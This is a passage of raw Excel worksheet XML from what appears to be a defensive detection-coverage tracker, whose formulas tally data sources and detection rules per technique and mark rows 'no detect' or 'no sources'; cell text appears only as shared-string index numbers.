      <c r="D132" t="s">
        <v>6</v>
      </c>
      <c r="E132" t="s">
        <v>906</v>
      </c>
      <c r="F132" s="9">
        <f t="shared" si="2"/>
        <v>5</v>
      </c>
      <c r="G132" s="9" cm="1">
        <f t="array" ref="G132">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H132" s="9" t="str" cm="1">
        <f t="array" ref="H132">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I132" s="9" t="str" cm="1">
        <f t="array" ref="I132">IF(SUM(IF($C132=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C132=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J132" s="9" t="str" cm="1">
        <f t="array" ref="J13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32" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M132" s="9" cm="1">
        <f t="array" ref="M132">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N132" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O132" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P132" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S13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32" t="s">
        <v>425</v>
      </c>
      <c r="U132" t="s">
        <v>907</v>
      </c>
      <c r="V132" t="s">
        <v>908</v>
      </c>
      <c r="W132" t="b">
        <v>1</v>
      </c>
      <c r="X132" t="s">
        <v>891</v>
      </c>
    </row>
    <row r="133" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A133" t="s">
        <v>891</v>
      </c>
      <c r="B133" t="s">
        <v>909</v>
      </c>
      <c r="C133" t="s">
        <v>910</v>
      </c>
      <c r="D133" t="s">
        <v>6</v>
      </c>
      <c r="E133" t="s">
        <v>911</v>
      </c>
      <c r="F133" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G133" s="9" cm="1">
        <f t="array" ref="G133">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H133" s="9" t="str" cm="1">
        <f t="array" ref="H133">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I133" s="9" t="str" cm="1">
        <f t="array" ref="I133">IF(SUM(IF($C133=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C133=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J133" s="9" t="str" cm="1">
        <f t="array" ref="J13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33" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M133" s="9" cm="1">
        <f t="array" ref="M133">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N133" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O133" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P133" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S13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33" t="s">
        <v>368</v>
      </c>
      <c r="U133" t="s">
        <v>912</v>
      </c>
      <c r="V133" t="s">
        <v>913</v>
      </c>
      <c r="W133" t="b">
        <v>1</v>
      </c>
      <c r="X133" t="s">
        <v>891</v>
      </c>
    </row>
    <row r="134" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A134" t="s">
        <v>891</v>
      </c>
      <c r="B134" t="s">
        <v>914</v>
      </c>
      <c r="C134" t="s">
        <v>915</v>
      </c>
      <c r="D134" t="s">
        <v>6</v>
      </c>
      <c r="E134" t="s">
        <v>916</v>
      </c>
      <c r="F134" s="9">
        <f t="shared" si="2"/>
        <v>4</v>
      </c>
      <c r="G134" s="9" cm="1">
        <f t="array" ref="G134">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H134" s="9" t="str" cm="1">
        <f t="array" ref="H134">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I134" s="9" t="str" cm="1">
        <f t="array" ref="I134">IF(SUM(IF($C134=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C134=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J134" s="9" t="str" cm="1">
        <f t="array" ref="J13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34" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M134" s="9" cm="1">
        <f t="array" ref="M134">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N134" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O134" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P134" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S13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34" t="s">
        <v>386</v>
      </c>
      <c r="U134" t="s">
        <v>917</v>
      </c>
      <c r="V134" t="s">
        <v>918</v>
      </c>
      <c r="W134" t="b">
        <v>1</v>
      </c>
      <c r="X134" t="s">
        <v>891</v>
      </c>
    </row>
    <row r="135" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A135" t="s">
        <v>891</v>
      </c>
      <c r="B135" t="s">
        <v>919</v>
      </c>
      <c r="C135" t="s">
        <v>920</v>
      </c>
      <c r="D135" t="s">
        <v>6</v>
      </c>
      <c r="E135" t="s">
        <v>921</v>
      </c>
      <c r="F135" s="9">
        <f t="shared" si="2"/>
        <v>4</v>
      </c>
      <c r="G135" s="9" cm="1">
        <f t="array" ref="G135">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H135" s="9" t="str" cm="1">
        <f t="array" ref="H135">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I135" s="9" t="str" cm="1">
        <f t="array" ref="I135">IF(SUM(IF($C135=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C135=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J135" s="9" t="str" cm="1">
        <f t="array" ref="J13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35" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M135" s="9" cm="1">
        <f t="array" ref="M135">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N135" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O135" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P135" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S13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35" t="s">
        <v>368</v>
      </c>
      <c r="U135" t="s">
        <v>922</v>
      </c>
      <c r="V135" t="s">
        <v>923</v>
      </c>
      <c r="W135" t="b">
        <v>1</v>
      </c>
      <c r="X135" t="s">
        <v>891</v>
      </c>
    </row>
    <row r="136" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A136" t="s">
        <v>891</v>
      </c>
      <c r="B136" t="s">
        <v>924</v>
      </c>
      <c r="C136" t="s">
        <v>925</v>
      </c>
      <c r="D136" t="s">
        <v>6</v>
      </c>
      <c r="E136" t="s">
        <v>926</v>
      </c>
      <c r="F136" s="9">
        <f t="shared" si="2"/>
        <v>5</v>
      </c>
      <c r="G136" s="9" cm="1">
        <f t="array" ref="G136">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H136" s="9" t="str" cm="1">
        <f t="array" ref="H136">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I136" s="9" t="str" cm="1">
        <f t="array" ref="I136">IF(SUM(IF($C136=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C136=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J136" s="9" t="str" cm="1">
        <f t="array" ref="J13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36" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M136" s="9" cm="1">
        <f t="array" ref="M136">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N136" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O136" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P136" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S13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36" t="s">
        <v>425</v>
      </c>
      <c r="U136" t="s">
        <v>927</v>
      </c>
      <c r="W136" t="b">
        <v>1</v>
      </c>
      <c r="X136" t="s">
        <v>891</v>
      </c>
    </row>
    <row r="137" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A137" t="s">
        <v>891</v>
      </c>
      <c r="B137" t="s">
        <v>928</v>
      </c>
      <c r="C137" t="s">
        <v>300</v>
      </c>
      <c r="D137" t="s">
        <v>6</v>
      </c>
      <c r="E137" t="s">
        <v>929</v>
      </c>
      <c r="F137" s="9">
        <f t="shared" si="2"/>
        <v>5</v>
      </c>
      <c r="G137" s="9" cm="1">
        <f t="array" ref="G137">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H137" s="9" t="str" cm="1">
        <f t="array" ref="H137">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I137" s="9" t="str" cm="1">
        <f t="array" ref="I137">IF(SUM(IF($C137=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C137=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J137" s="9" t="str" cm="1">
        <f t="array" ref="J13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37" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M137" s="9" cm="1">
        <f t="array" ref="M137">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N137" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O137" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P137" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S13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37" t="s">
        <v>930</v>
      </c>
      <c r="U137" t="s">
        <v>931</v>
      </c>
      <c r="W137" t="b">
        <v>1</v>
      </c>
      <c r="X137" t="s">
        <v>891</v>
      </c>
    </row>
    <row r="138" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A138" t="s">
        <v>891</v>
      </c>
      <c r="B138" t="s">
        <v>932</v>
      </c>
      <c r="C138" t="s">
        <v>933</v>
      </c>
      <c r="D138" t="s">
        <v>6</v>
      </c>
      <c r="E138" t="s">
        <v>934</v>
      </c>
      <c r="F138" s="9">
        <f t="shared" si="2"/>
        <v>8</v>
      </c>
      <c r="G138" s="9" cm="1">
        <f t="array" ref="G138">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H138" s="9" t="str" cm="1">
        <f t="array" ref="H138">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I138" s="9" t="str" cm="1">
        <f t="array" ref="I138">IF(SUM(IF($C138=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C138=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J138" s="9" t="str" cm="1">
        <f t="array" ref="J13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38" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M138" s="9" cm="1">
        <f t="array" ref="M138">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N138" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O138" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P138" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S13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38" t="s">
        <v>368</v>
      </c>
      <c r="U138" t="s">
        <v>935</v>
      </c>
      <c r="W138" t="b">
        <v>1</v>
      </c>
      <c r="X138" t="s">
        <v>891</v>
      </c>
    </row>
    <row r="139" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A139" t="s">
        <v>891</v>
      </c>
      <c r="B139" t="s">
        <v>936</v>
      </c>
      <c r="C139" t="s">
        <v>937</v>
      </c>
      <c r="D139" t="s">
        <v>6</v>
      </c>
      <c r="E139" t="s">
        <v>777</v>
      </c>
      <c r="F139" s="9">
        <f t="shared" si="2"/>
        <v>1</v>
      </c>
      <c r="G139" s="9" cm="1">
        <f t="array" ref="G139">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H139" s="9" t="str" cm="1">
        <f t="array" ref="H139">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I139" s="9" t="str" cm="1">
        <f t="array" ref="I139">IF(SUM(IF($C139=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C139=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J139" s="9" t="str" cm="1">
        <f t="array" ref="J13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39" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M139" s="9" cm="1">
        <f t="array" ref="M139">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N139" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O139" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P139" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S13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39" t="s">
        <v>425</v>
      </c>
      <c r="U139" t="s">
        <v>938</v>
      </c>
      <c r="W139" t="b">
        <v>1</v>
      </c>
      <c r="X139" t="s">
        <v>891</v>
      </c>
    </row>
    <row r="140" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A140" t="s">
        <v>939</v>
      </c>
      <c r="B140" t="s">
        <v>939</v>
      </c>
      <c r="C140" t="s">
        <v>23</v>
      </c>
      <c r="D140" t="s">
        <v>11</v>
      </c>
      <c r="E140" t="s">
        <v>940</v>
      </c>
      <c r="F140" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G140" s="9" cm="1">
        <f t="array" ref="G140">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H140" s="9" cm="1">
        <f t="array" ref="H140">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>5</v>
      </c>
      <c r="I140" s="9" t="str" cm="1">
        <f t="array" ref="I140">IF(SUM(IF($C140=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C140=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J140" s="9" cm="1">
        <f t="array" ref="J14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140" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>5</v>
      </c>
      <c r="M140" s="9" cm="1">
        <f t="array" ref="M140">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>5</v>
      </c>
      <c r="N140" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O140" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P140" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S14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40" t="s">
        <v>425</v>
      </c>
      <c r="U140" t="s">
        <v>941</v>
      </c>
      <c r="V140" t="s">
        <v>942</v>
      </c>
      <c r="W140" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="141" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A141" t="s">
        <v>939</v>
      </c>
      <c r="B141" t="s">
        <v>943</v>
      </c>
      <c r="C141" t="s">
        <v>247</v>
      </c>
      <c r="D141" t="s">
        <v>11</v>
      </c>
      <c r="E141" t="s">
        <v>940</v>
      </c>
      <c r="F141" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G141" s="9" cm="1">
        <f t="array" ref="G141">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H141" s="9" t="str" cm="1">
        <f t="array" ref="H141">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I141" s="9" t="str" cm="1">
        <f t="array" ref="I141">IF(SUM(IF($C141=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C141=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J141" s="9" t="str" cm="1">
        <f t="array" ref="J14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41" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M141" s="9" cm="1">
